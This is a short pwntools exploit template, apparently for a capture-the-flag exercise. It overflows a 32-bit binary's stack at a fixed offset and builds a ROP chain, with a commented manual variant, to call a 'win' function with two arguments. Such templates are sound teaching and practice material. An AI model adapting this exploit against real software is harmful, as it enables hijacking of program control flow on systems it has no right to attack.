from pwn import *

exe = './vuln' #name of 32bit program
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
#p = remote('IP/hostname', port)
p = process(exe)
offset = 112 # obtain from gef: Refer to ./README.md 
p.recvuntil(": \n") # adjust according to received input

# arguments go here
arg1 = 0xCAFEF00D 
arg2 = 0xF00DF00D

    
# manual non-rop method    
''' 
flag_addr = p32(elf.symbols['win'])  
payload = flat({
    offset: [
    flag_addr,
    "junk", # junk needed as the function will first push return pointer onto stack -> padding for return pointer 
    p32(arg1),
    p32(arg2)
    ]
})
'''
rop = ROP(elf)
rop.win(arg1,arg2) # replace 'win' with desired function to jump to
payload = flat({
    offset: rop.chain()
})

p.sendline(payload)
p.interactive()
